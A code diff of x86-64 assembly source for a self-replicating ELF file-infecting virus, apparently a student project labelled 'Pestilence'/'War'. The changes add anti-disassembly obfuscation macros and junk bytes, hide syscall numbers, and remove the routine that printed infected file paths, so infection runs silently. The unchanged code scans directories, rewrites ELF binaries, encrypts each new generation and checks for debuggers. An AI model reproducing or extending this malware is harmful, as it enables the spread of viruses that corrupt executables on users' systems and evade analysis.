@@ -5,28 +5,43 @@ global _start
 
 _start:
 	PUSHAQ
+	BIG_OBF2 ; no more IDA
 key:
 	mov rdi, 0x8037ee39550c7610
+	OBF
 	mov rsi, 0x8037ee39550c7610
+
+	lea rax, [rel decryptor]
+	sub r10, r10
+	OBF
+	xor r10, main - decryptor
+	add rax, r10
+	OBF
 	cmp rdi, rsi
-	je main
+	je no_decryptor
+
 	lea rsi, [rel encryption_start]
 	lea rdx, [rel encryption_end]
 	sub rdx, rsi
-	push rdi
+	push rax
+	OBF
 	call decryptor
-	pop rdi
-	jmp main
+	pop rax
+	no_decryptor:
+	BIG_OBF2
+	jmp rax
 
 decryptor:	;rdi:key  rsi:addr rdx:size
 	enter 0, 0
 	xor rcx, rcx
 	while_decrypt:
+		OBF
 		cmp rcx, rdx
 		jge end_decryptor
 		trunc_key:
 			mov r9, rdx
 			sub r9, rcx
+			OBF
 			cmp r9, 8
 			jg end_trunc
 			mov r10, r9
@@ -35,6 +50,7 @@ decryptor:	;rdi:key  rsi:addr rdx:size
 			imul r9, 8
 			push rcx
 			mov rcx, r9
+			OBF
 			shl rdi, cl
 			shr rdi, cl
 			pop rcx
@@ -44,10 +60,12 @@ decryptor:	;rdi:key  rsi:addr rdx:size
 		mov QWORD [rsi], r9
 		add rsi, 8
 		add rcx, 8
+		OBF
 		jmp while_decrypt
 	end_decryptor:
 	leave
 	ret
+	db 0xeb
 
 encryption_start:
 memcpy:
@@ -57,6 +75,7 @@ memcpy:
 	rep movsb
 	leave
 	ret
+	db 0xeb
 
 memset:
 	enter 0, 0
@@ -66,6 +85,7 @@ memset:
 	rep stosb
 	leave
 	ret
+	db 0xeb
 
 strcmp:
 	enter 0, 0
@@ -87,6 +107,7 @@ strcmp:
 	pop r8
 	leave
 	ret
+	db 0xeb
 
 strcat:
 	enter 0, 0
@@ -107,6 +128,7 @@ strcat:
 	pop r8
 	leave
 	ret
+	db 0xeb
 
 strlen:
 	enter 0, 0
@@ -123,32 +145,7 @@ strlen:
 	pop rsi
 	leave
 	ret
-
-puts:
-	enter 0, 0
-	push r8
-	push rcx
-	push rdi
-	call strlen
-	pop rsi
-	mov r8b, byte[rsi + rax - 1]
-	xor rdi, rdi
-	mov rdx, rax
-	mov rax, sys_write
-	syscall
-	padding
-	cmp r8b, 0xa
-	je end_puts
-	mov rdi, 0
-	lea rsi, [rel new_line]
-	mov rdx, 1
-	mov rax, sys_write
-	syscall
-	end_puts:
-	pop rcx
-	pop r8
-	leave
-	ret
+	db 0xeb
 
 check_addr:		;	rdi:elf_struc  rsi:addr
 	enter 0, 0
@@ -167,6 +164,7 @@ check_addr:		;	rdi:elf_struc  rsi:addr
 	pop r13
 	leave
 	ret
+	db 0xeb
 
 check_str_in_addr:	; rdi:elf_struc rsi:str
 	enter 0, 0
@@ -185,6 +183,7 @@ check_str_in_addr:	; rdi:elf_struc rsi:str
 	mov rax, 1
 	leave
 	ret
+	db 0xeb
 
 modify_sections:
 	enter 0, 0
@@ -228,6 +227,7 @@ modify_sections:
 	mov rax, 1
 	leave
 	ret
+	db 0xeb
 
 modify_segments:
 	enter 0, 0
@@ -313,6 +313,7 @@ modify_segments:
 	mov rax, QWORD[r8 + elf_struc.data_phdr]
 	leave
 	ret
+	db 0xeb
 
 fill_data_sec:
 	enter 0, 0
@@ -393,13 +394,14 @@ fill_data_sec:
 	mov rax, QWORD[r8 + elf_struc.data_shdr]
 	leave
 	ret
+	db 0xeb
 
 encrypt_new_gen:	; rdi:bin_addr
 	enter 0, 0
 	push rdi
 	lea rdi, [rel rand_file]
 	mov rsi, OPEN_FILE_PERMISSION
-	mov rax, sys_open
+	SYS_NUM sys_open
 	syscall
 	padding
 	cmp rax, 0
@@ -409,12 +411,12 @@ encrypt_new_gen:	; rdi:bin_addr
 	mov rsi, rsp
 	mov rdx, 8
 	push rax
-	mov rax, sys_read
+	SYS_NUM sys_read
 	syscall
 	padding
 	pop rax
 	mov rdi, rax
-	mov rax, sys_close
+	SYS_NUM sys_close
 	syscall
 	padding
 
@@ -433,6 +435,7 @@ encrypt_new_gen:	; rdi:bin_addr
 
 	leave
 	ret
+	db 0xeb
 
 change_fingerprint:	;rdi:addr   rsi:key
 	enter 0, 0
@@ -461,6 +464,7 @@ change_fingerprint:	;rdi:addr   rsi:key
 	while_rcx_end:
 	leave
 	ret
+	db 0xeb
 
 rewrite_binary:
 	enter 0, 0
@@ -476,8 +480,7 @@ rewrite_binary:
 	sub r8, r9
 	mov r9, r8
 	inc r9
-	sub rax, rax
-	xor rax, sys_mmap
+	SYS_NUM sys_mmap
 	push r11
 	syscall
 	padding
@@ -566,7 +569,7 @@ rewrite_binary:
 
 	mov rdi, QWORD[r11 + elf_struc.path]
 	mov rsi, 513
-	mov rax, sys_open
+	SYS_NUM sys_open
 	push r11
 	syscall
 	padding
@@ -578,7 +581,7 @@ rewrite_binary:
 	mov rdi, rax
 	mov rsi, QWORD[r11 + elf_struc.new_bin_addr]
 	mov rdx, r13
-	mov rax, sys_write
+	SYS_NUM sys_write
 	push r11
 	syscall
 	padding
@@ -589,14 +592,14 @@ rewrite_binary:
 	sub rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
 	neg rsi
 	add rsi, QWORD[r11 + elf_struc.bits_added]
-	mov rax, sys_munmap
+	SYS_NUM sys_munmap
 	push r11
 	syscall
 	padding
 	pop r11
 
 	mov rdi, QWORD[r11 + elf_struc.fd2]
-	mov rax, sys_close
+	SYS_NUM sys_close
 	syscall
 	padding
 
@@ -677,19 +680,17 @@ infect_elf:		; r8:elf_struc
 	cmp rax, 0
 	je infect_elf_end
 
-	mov rdi, QWORD[r8 + elf_struc.path]
-	call puts
-
 	infect_elf_end:
 	leave
 	ret
+	db 0xeb
 
 process_file:
 	enter 0, 0
 	sub rsp, ELF_STRUC_SIZE
 	mov QWORD[rsp + elf_struc.path], rdi
 
-	mov rax, sys_lstat
+	SYS_NUM sys_lstat
 	lea rsi, [rsp + elf_struc.stat]
 	syscall
 	padding
@@ -716,7 +717,7 @@ process_file:
 
 	mov rdi, QWORD[rsp + elf_struc.path]
 	mov rsi, OPEN_FILE_PERMISSION
-	mov rax, sys_open
+	SYS_NUM sys_open
 	syscall						; opening the file
 	padding
 	mov QWORD[rsp + elf_struc.fd], rax
@@ -733,7 +734,7 @@ process_file:
 	xor r8, r8
 	mov r8, QWORD[rsp + elf_struc.fd]
 	mov r9, 0
-	mov rax, sys_mmap
+	SYS_NUM sys_mmap
 	syscall						;mmap the file
 	padding
 	mov QWORD[rsp + elf_struc.ptr], rax
@@ -748,19 +749,20 @@ process_file:
 	mov rdi, QWORD[rsp + elf_struc.ptr]
 	xor rsi, rsi
 	mov esi, DWORD[rsp + elf_struc.stat + stat.st_size]
-	mov rax, sys_munmap			;munmap the file
+	SYS_NUM sys_munmap			;munmap the file
 	syscall
 	padding
 
 	close_file:
 	mov edi, DWORD[rsp + elf_struc.fd]
-	mov rax, sys_close
+	SYS_NUM sys_close
 	syscall
 	padding
 	process_file_end:
 	mov rax, 0
 	leave
 	ret
+	db 0xeb
 
 check_proc:
 	enter 0, 0
@@ -777,7 +779,7 @@ check_proc:
 
 	lea rdi, [rbp - NAME_SIZE]
 	mov rsi, OPEN_PROC_PERMISSION
-	mov rax, sys_open
+	SYS_NUM sys_open
 	syscall			;open the proc file
 	padding
 	mov r10, rax
@@ -787,14 +789,14 @@ check_proc:
 	mov rdi, rax
 	lea rsi, [rsp]
 	mov rdx, CONTENT_SIZE
-	mov rax, sys_read
+	SYS_NUM sys_read
 	syscall			;read the proc file
 	padding
 	mov byte[rsp + rax], 0
 	cmp rax, 0
 	jl proc_ret_0
 
-	mov rax, sys_close
+	SYS_NUM sys_close
 	mov rdi, r10
 	syscall			;close the proc file
 	padding
@@ -812,13 +814,14 @@ check_proc:
 	proc_end:
 	leave
 	ret
+	db 0xeb
 
 process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:function pointer		r11:ret value
 	enter 0, 0
 	sub rsp, DIRENT_SIZE + NAME_SIZE
 	mov r13, rdi
 	mov r10, rsi
-	mov rax, sys_open
+	SYS_NUM sys_open
 	mov rsi, OPEN_DIR_PERMISSION
 	xor rdx, rdx
 	syscall							; it opens the dir
@@ -830,7 +833,7 @@ process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:functi
 		mov rdi, r12
 		lea rsi, [rsp]
 		mov rdx, DIRENT_SIZE
-		mov rax, sys_getdents
+		SYS_NUM sys_getdents
 		syscall						; it reads dir entries
 		padding
 
@@ -887,7 +890,7 @@ process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:functi
 		jmp read_dirent
 	close_dir:
 	push r11
-	mov rax, sys_close
+	SYS_NUM sys_close
 	mov rdi, r12
 	syscall
 	pop r11
@@ -895,6 +898,7 @@ process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:functi
 	mov rax, r11
 	leave
 	ret
+	db 0xeb
 
 
 
@@ -903,7 +907,7 @@ check_debug:
 	sub rsp, NAME_SIZE + 8
 	lea rdi, [rel self_status]
 	mov rsi, OPEN_PROC_PERMISSION
-	mov rax, sys_open
+	SYS_NUM sys_open
 	syscall
 	padding
 	cmp rax, 0
@@ -912,7 +916,7 @@ check_debug:
 	mov rdi, rax
 	lea rsi, [rsp + 8]
 	mov rdx, NAME_SIZE
-	mov rax, sys_read
+	SYS_NUM sys_read
 	syscall
 	padding
 	mov rbx, rax
@@ -939,25 +943,29 @@ check_debug:
 	debuged_end:
 	push rax
 	mov rdi, QWORD[rsp + 8]
-	mov rax, sys_close
+	SYS_NUM sys_close
 	syscall
 	padding
 	pop rax
 	leave
 	ret
+	db 0xeb
 
 
 main:
+	BIG_OBF2
 	call check_debug
 	cmp rax, 1
 	je jmp_old_entry
 	lea rdi, [rel proc_dir]
 	lea rsi, [rel check_proc]
+	OBF
 	call process_dir
 	cmp rax, 1
 	je jmp_old_entry
 	lea rdi, [rel dir1]
 	lea rsi, [rel process_file]
+	BIG_OBF2
 	call process_dir
 	lea rdi, [rel dir2]
 	lea rsi, [rel process_file]
@@ -968,20 +976,22 @@ ret_0:
 	mov rax, 0
 	leave
 	ret
+	db 0xeb
 
 ret_1:
 	mov rax, 1
 	leave
 	ret
+	db 0xeb
 
 jmp_old_entry:
 	mov rdi, 0x2322a163f2fcad26
 	mov rsi, 0x2322a163f2fcad26
 	cmp rdi, rsi
 	jne the_jump							; exit if real famine
-		mov rax, 60
-		xor rdi, rdi
-	syscall
+		SYS_NUM sys_exit
+		sub rdi, rsi
+		syscall
 	the_jump:
 	lea rax, [rel _start]
 	sub rax, rdi
@@ -1013,7 +1023,7 @@ data_name:
 encryption_end:
 	db 0
 signature:
-	db 'War version 1.0 (c)oded by gdelabro - '
+	db 'Pestilence version 1.0 (c)oded by gdelabro',0, ' - '
 fingerprint:
 	db '00000000', 0
 end:
